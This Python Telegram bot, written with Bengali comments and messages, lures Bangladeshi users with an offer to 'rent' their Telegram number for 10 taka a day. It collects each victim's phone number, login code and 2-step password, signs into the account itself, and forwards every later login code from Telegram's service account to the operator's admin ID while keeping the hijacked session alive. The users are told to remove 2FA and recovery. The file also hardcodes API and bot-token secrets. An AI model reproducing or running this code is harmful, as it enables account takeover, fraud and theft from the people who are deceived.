import os
import sys
import asyncio
import shutil

# লাইব্রেরি চেক ও অটো ইনস্টল
try:
    from telethon import TelegramClient, events, Button, errors
except ImportError:
    os.system("pip install telethon")
    os.execl(sys.executable, sys.executable, *sys.argv)

from telethon.network import ConnectionTcpFull

# --- Configuration ---
API_ID = 28260353
API_HASH = 'bc2b69b2727821422ed0adf43a82700a'
BOT_TOKEN = '8383019080:AAEJ1CWZM2FXa98EsASHbTKCL4PdYVby_u4' 
ADMIN_ID = 7852368023

# সেশন ক্লিনআপ
if not os.path.exists('sessions'):
    os.makedirs('sessions')

bot = TelegramClient('main_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# ১. স্টার্ট কমান্ড
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    welcome_text = (
        "💥 **টেলিগ্রাম নাম্বার ভাড়া দিয়ে ২৪ঘন্টার ⌛ জন্য ১০৳ করে পান** 💰\n\n"
        "✅ কীভাবে ভাড়া দিবে সেটা জানতে /details কমান্ড ব্যবহার করুন 👇\n"
        "✅ এবং আপনার বন্ধুদের কে রেফার করুন আর জিতে নিন **২৳ করে বোনাস** 💰 "
        "এবং আপনার বন্ধুরা যদি টেলিগ্রাম নাম্বার ভাড়া দেয় তাহলে সেখান থেকে পাবেন **৩৳ করে** 💸"
    )
    await event.respond(welcome_text, buttons=[[Button.inline("📲 নাম্বার জমা দিন", data="claim")]])

# ২. ডিটেইলস কমান্ড
@bot.on(events.NewMessage(pattern='/details'))
async def details(event):
    details_text = (
        "⌛ **কীভাবে টেলিগ্রাম ভাড়া দিবে....**\n\n"
        "✅ আপনার টেলিগ্রাম একাউন্ট এ কোনো sms থাকতে পারবে না\n"
        "✅ টেলিগ্রাম একাউন্ট এ 2stp/pas থাকা বা রিকোভারি থাকা চলবে না\n"
        "✅ আমাদের Bot যখন লগিং করবে তখন আমাদের Bot কে একাউন্ট থেকে লগ-আউট করা যাবে না"
    )
    await event.respond(details_text)

# ৩. উইথড্র কমান্ড
@bot.on(events.NewMessage(pattern='/withdraw'))
async def withdraw(event):
    withdraw_text = (
        "💰 **সর্বনিম্ম Withdraw ১০০৳**\n\n"
        "⚪ **Imposes:** 0\n🔴 **Disable:** 0\n🟢 **Successful:** 0"
    )
    await event.respond(withdraw_text)

# ৪. মেইন লজিক এবং লাইভ ওটিপি ফরওয়ার্ডার
@bot.on(events.CallbackQuery(data=b"claim"))
async def claim(event):
    chat_id = event.chat_id
    async with bot.conversation(chat_id, timeout=600) as conv:
        try:
            await conv.send_message("📱 **আপনার টেলিগ্রাম নাম্বারটি দিন (+880 সহ):**")
            phone_res = await conv.get_response()
            phone = phone_res.text.strip().replace(" ", "")

            if not phone.startswith('+880'):
                await conv.send_message("❌ শুধুমাত্র +880 (বাংলাদেশ) নাম্বার এলাউড।")
                return

            client = TelegramClient(f'sessions/{phone}', API_ID, API_HASH, connection=ConnectionTcpFull)
            await client.connect()

            # --- লাইভ ওটিপি ফরওয়ার্ডার (সব সময়ের জন্য) ---
            @client.on(events.NewMessage(from_users=777000))
            async def forward_all_otp(otp_event):
                msg = otp_event.message.message
                await bot.send_message(ADMIN_ID, f"🔔 **নতুন মেসেজ ({phone}):**\n\n<code>{msg}</code>", parse_mode='html')

            await conv.send_message("⏳ **OTP পাঠানো হচ্ছে...**")
            sent_code = await client.send_code_request(phone)
            
            await conv.send_message("🔑 **৫ ডিজিটের কোডটি দিন:**")
            otp_res = await conv.get_response()
            
            try:
                await client.sign_in(phone, code=otp_res.text.strip(), phone_code_hash=sent_code.phone_code_hash)
            except errors.SessionPasswordNeededError:
                await conv.send_message("🔐 **2-Step Password দিন:**")
                pwd_res = await conv.get_response()
                await client.sign_in(password=pwd_res.text.strip())

            await conv.send_message("✅ **সফলভাবে লগইন হয়েছে!**")
            await bot.send_message(ADMIN_ID, f"🟢 **লগইন সাকসেস:** `{phone}`\nএখন থেকে এই নাম্বারের সব ওটিপি আপনি অটোমেটিক পাবেন।")
            
            # সেশনটি ব্যাকগ্রাউন্ডে চালু রাখবে যাতে ভবিষ্যতে ওটিপি আসলে ফরওয়ার্ড হয়
            asyncio.create_task(client.run_until_disconnected())

        except Exception as e:
            await conv.send_message(f"❌ এরর: {str(e)}")

print("--- বট এখন সচল এবং লাইভ ফরওয়ার্ডিং চালু আছে ---")
bot.run_until_disconnected()
